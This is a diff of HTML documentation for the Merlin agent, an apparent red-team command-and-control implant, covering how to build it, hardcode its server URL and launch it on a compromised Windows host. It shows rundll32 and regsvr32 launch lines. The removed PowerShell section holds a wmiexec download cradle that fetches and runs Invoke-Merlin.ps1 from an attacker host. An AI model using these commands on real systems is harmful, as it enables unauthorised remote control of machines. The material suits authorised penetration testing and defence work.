@@ -103,7 +103,6 @@
 </ul>
 </li>
 <li class="toctree-l3"><a class="reference internal" href="#recompile-dll">Recompile DLL</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#powershell-invoke-merlin-ps1">PowerShell - Invoke-Merlin.ps1</a></li>
 </ul>
 </li>
 </ul>
@@ -114,9 +113,7 @@
 <ul>
 <li class="toctree-l1"><a class="reference internal" href="../agent/cli.html">Command Line Flags</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../agent/dll.html">DLL Agent</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../agent/powershell.html">PowerShell</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../agent/custom.html">Custom Build</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../agent/javascript.html">JavaScript Agent</a></li>
 </ul>
 <p class="caption"><span class="caption-text">Merlin Server</span></p>
 <ul>
@@ -206,6 +203,11 @@
 <div class="line-block">
 <div class="line"><strong>Pre-compiled Merlin Agent binary files are distributed with the server download in the</strong> <code class="docutils literal notranslate"><span class="pre">data/bin/</span></code> <strong>directory of Merlin</strong></div>
 </div>
+<p>The Merlin Agent source code can be found <a class="reference external" href="https://github.com/Ne0nd0g/merlin-agent">https://github.com/Ne0nd0g/merlin-agent</a></p>
+<p>Retrieve with Go and build the Agent:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">go</span> <span class="n">get</span> <span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">Ne0nd0g</span><span class="o">/</span><span class="n">merlin</span><span class="o">-</span><span class="n">agent</span>
+</pre></div>
+</div>
 <div class="section" id="upload-execute">
 <h2>Upload &amp; Execute<a class="headerlink" href="#upload-execute" title="Permalink to this headline">¶</a></h2>
 <p>One of the more simple ways to run Merlin is by uploading the compiled binary file to a compromised host and then execute that binary.</p>
@@ -287,7 +289,7 @@ C:\&gt;rundll32.exe \\192.168.1.100\WxlV\merlin.dll,Run https://192.168.1.100:44
 <h4>Advanced<a class="headerlink" href="#advanced" title="Permalink to this headline">¶</a></h4>
 <p>The quick start examples above executed the Merlin agent and allowed the user to dynamically specify the location of the listening Merlin server with a command line parameter. There are a few instances where we the user is unable to specify, or simply don’t want to, the URL for the listening Merlin server. In this case, the Merlin agent binary should be recompiled with a hardcoded URL of the listening Merlin server so that it does not need to be specified by the user during execution. <em>Do not continue on unless you are OK to deal with things that sometimes work and often have bugs and are not reliable.</em></p>
 <div class="line-block">
-<div class="line">This will require that you have Go and gcc installed on the host compiling the application. View the DLL’s <a class="reference external" href="https://github.com/Ne0nd0g/merlin/blob/dev/data/bin/dll/README.MD">README</a> for additional information.</div>
+<div class="line">This will require that you have Go and gcc installed on the host compiling the application</div>
 </div>
 </div>
 </div>
@@ -296,19 +298,19 @@ C:\&gt;rundll32.exe \\192.168.1.100\WxlV\merlin.dll,Run https://192.168.1.100:44
 <p>The <cite>merlin.dll</cite> file can be configured with the hardcoded url of your Merlin server. To do this, clone the repo, modify the file, and recompile it.</p>
 <ol class="arabic simple">
 <li>Clone the merlin repository using git</li>
-<li>Edit the file at <cite>cmd/merlinagentdll/main.go</cite></li>
+<li>Edit the <cite>main.go</cite> file</li>
 <li>Find the string <cite>var url = “https://127.0.0.1:443/”</cite> and change the address</li>
 <li>Compile the DLL</li>
 </ol>
 <p>example:</p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cd</span> <span class="o">/</span><span class="n">opt</span>
-<span class="n">git</span> <span class="n">clone</span> <span class="o">-</span><span class="n">b</span> <span class="n">dev</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">Ne0nd0g</span><span class="o">/</span><span class="n">merlin</span><span class="o">.</span><span class="n">git</span>
-<span class="n">cd</span> <span class="n">merlin</span>
-<span class="n">sed</span> <span class="o">-</span><span class="n">i</span> <span class="s1">&#39;s_https://127.0.0.1:443/_https://192.168.1.100:443/_&#39;</span> <span class="n">cmd</span><span class="o">/</span><span class="n">merlinagentdll</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">go</span>
-<span class="n">make</span> <span class="n">agent</span><span class="o">-</span><span class="n">dll</span>
+<span class="n">git</span> <span class="n">clone</span> <span class="o">-</span><span class="n">b</span> <span class="n">dev</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">Ne0nd0g</span><span class="o">/</span><span class="n">merlin</span><span class="o">-</span><span class="n">agent</span><span class="o">-</span><span class="n">dll</span><span class="o">.</span><span class="n">git</span>
+<span class="n">cd</span> <span class="n">merlin</span><span class="o">-</span><span class="n">agent</span><span class="o">-</span><span class="n">dll</span>
+<span class="n">sed</span> <span class="o">-</span><span class="n">i</span> <span class="s1">&#39;s_https://127.0.0.1:443/_https://192.168.1.100:443/_&#39;</span> <span class="n">main</span><span class="o">.</span><span class="n">go</span>
+<span class="n">make</span>
 </pre></div>
 </div>
-<p>This will leave the <cite>merlin.dll</cite> in the <cite>data/temp/v0.5.0/</cite> directory where <cite>v0.5.0</cite> is the current version number of Merlin. Now the recompdiled version of the DLL can be run without having to specify the address of the Merlin server.</p>
+<p>This will leave the <cite>merlin.dll</cite> in the <cite>bin/v0.5.0/</cite> directory where <cite>v0.5.0</cite> is the current version number of Merlin. Now the recompiled version of the DLL can be run without having to specify the address of the Merlin server.</p>
 <p>rundll32.exe examples:</p>
 <ul class="simple">
 <li><code class="docutils literal notranslate"><span class="pre">rundll32.exe</span> <span class="pre">merlin,main</span></code></li>
@@ -320,43 +322,6 @@ C:\&gt;rundll32.exe \\192.168.1.100\WxlV\merlin.dll,Run https://192.168.1.100:44
 <li><code class="docutils literal notranslate"><span class="pre">regsvr32.exe</span> <span class="pre">/s</span> <span class="pre">/u</span> <span class="pre">merlin.dll</span></code></li>
 <li><code class="docutils literal notranslate"><span class="pre">regsvr32.exe</span> <span class="pre">/s</span> <span class="pre">/n</span> <span class="pre">/i</span> <span class="pre">merlin.dll</span></code></li>
 </ul>
-</div>
-<div class="section" id="powershell-invoke-merlin-ps1">
-<h3>PowerShell - Invoke-Merlin.ps1<a class="headerlink" href="#powershell-invoke-merlin-ps1" title="Permalink to this headline">¶</a></h3>
-<div class="line-block">
-<div class="line"><strong>WARNING: This script is very unstable</strong></div>
-</div>
-<p>The <code class="docutils literal notranslate"><span class="pre">Invoke-Merlin.ps1</span></code> PowerShell script can be found in the <code class="docutils literal notranslate"><span class="pre">data/bin/powershell</span></code> directory. This script leverages the work done by the PowerSploit team to reflectively load  <cite>merlin.dll</cite> into memory. View the <a class="reference external" href="https://github.com/Ne0nd0g/merlin/blob/dev/data/bin/powershell/README.MD">README</a> for additional details. By default, Invoke-Merlin connects to <cite>https://127.0.0.1:443/</cite>. At the time of this writing, I have not found a way to provide an argument of the listening Merlin server’s address when calling the DLL. Therefore, this requires recompiling the DLL with the hardcoded address of the listening Merlin server as shown in the <em>Recompile DLL</em> section above. The <cite>Invoke-Merlin.ps1</cite> script needs to be updated with the Base64 encoded version of the new recompiled <cite>merlin.dll</cite> file. The quickest way to update Invoke-Merlin.ps1 is to use the set commands below from a PowerShell terminal.</p>
-<ul class="simple">
-<li>Read the DLL into a variable:</li>
-</ul>
-<blockquote>
-<div><code class="docutils literal notranslate"><span class="pre">$PEBytes</span> <span class="pre">=</span> <span class="pre">[IO.File]::ReadAllBytes('C:/Go/src/Ne0nd0g/merlin/data/bin/dll/merlin.dll')</span></code></div></blockquote>
-<ul>
-<li><p class="first">Base64 encode the DLL and save it in another variable:</p>
-<p><code class="docutils literal notranslate"><span class="pre">$Base64String</span> <span class="pre">=</span> <span class="pre">[System.Convert]::ToBase64String($PEBytes)</span></code></p>
-</li>
-<li><p class="first">Update the existing Invoke-Merlin.ps1 script with the Base64 encoded version of the newly compiled DLL:</p>
-<p><code class="docutils literal notranslate"><span class="pre">(Get-Content</span> <span class="pre">data/bin/powershell/Invoke-Merlin.ps1)</span> <span class="pre">|</span> <span class="pre">foreach-object</span> <span class="pre">{$_</span> <span class="pre">-replace</span> <span class="pre">'^\$global\:merlin</span> <span class="pre">\=</span> <span class="pre">(.*)',</span> <span class="pre">('$global:merlin</span> <span class="pre">=</span> <span class="pre">'</span> <span class="pre">+</span> <span class="pre">&quot;'&quot;</span> <span class="pre">+</span> <span class="pre">$Base64String</span> <span class="pre">+</span> <span class="pre">&quot;'&quot;)}</span> <span class="pre">|</span> <span class="pre">Set-Content</span> <span class="pre">data/bin/powershell/Invoke-Merlin.ps1</span></code></p>
-</li>
-</ul>
-<p>Now the Invoke-Merlin script is ready to be downloaded and executed. Fair warning, the script can be extremely executing the call back to the listening Merlin server. Give it a couple of minutes before rage quitting. Additionally, the <cite>-ForceASLR</cite> flag for Invoke-Merlin.ps1 is required to circumvent other errors that arise when executing the script. Host the Invoke-Merlin.ps1 script on any web server and use a PowerShell download cradel to execute it on the remote host.</p>
-<p>Python’s <cite>SimpleHTTPServer</cite> module can be used to quickly host the file. Move into the directory where you have a copy of the updated Invoke-Merlin.ps1 script and run the Python module.</p>
-<p>python SimpleHTTPServer example:</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">SimpleHTTPServer</span> <span class="mi">80</span>
-</pre></div>
-</div>
-<p>Now the script can be downloaded and executed on a remote host using a tool like Impacket’s wmiexec.py.</p>
-<p>wmiexec.py example:</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@kali</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">impacket</span><span class="o">/</span><span class="n">examples</span><span class="c1"># python wmiexec.py bob:password@192.168.1.92 &quot;powershell -c IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.1.100/Invoke-Merlin.ps1&#39;);Invoke-Merlin -ForceASLR&quot;</span>
-<span class="n">Impacket</span> <span class="n">v0</span><span class="o">.</span><span class="mf">9.15</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2002</span><span class="o">-</span><span class="mi">2016</span> <span class="n">Core</span> <span class="n">Security</span> <span class="n">Technologies</span>
-
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">SMBv2</span><span class="o">.</span><span class="mi">1</span> <span class="n">dialect</span> <span class="n">used</span>
-
-<span class="o">^</span><span class="n">C</span><span class="p">[</span><span class="o">-</span><span class="p">]</span>
-<span class="n">root</span><span class="nd">@kali</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">impacket</span><span class="o">/</span><span class="n">examples</span><span class="c1">#</span>
-</pre></div>
-</div>
 </div>
 </div>
 </div>
